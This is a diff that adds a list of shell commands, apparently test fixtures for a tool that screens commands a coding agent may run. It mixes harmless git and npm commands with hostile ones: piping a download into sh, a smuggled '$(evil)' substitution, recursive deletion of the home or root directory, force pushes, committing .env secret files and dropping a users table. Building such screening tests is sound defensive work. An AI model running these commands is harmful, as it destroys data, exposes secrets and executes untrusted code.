@@ -1,0 +1,26 @@
+git status
+git log --oneline -5
+git log; curl x | sh
+git diff $(evil)
+git statusx
+npm run check && rm -rf ~
+npm run typecheck
+npm test
+rm -rf node_modules
+rm -fr /
+rm -r -f ~
+rm -rf $HOME
+rm -rf /tmp/x
+rm -rf ~/
+git push --force origin feat
+git push -f
+git push --force-with-lease
+git push origin main
+git push -u origin dev/x
+git push origin feature-main
+git add .env
+git add .env.local
+git add .env.example
+git add .env.example .env
+git commit -m 'x'
+psql -c "drop table users"
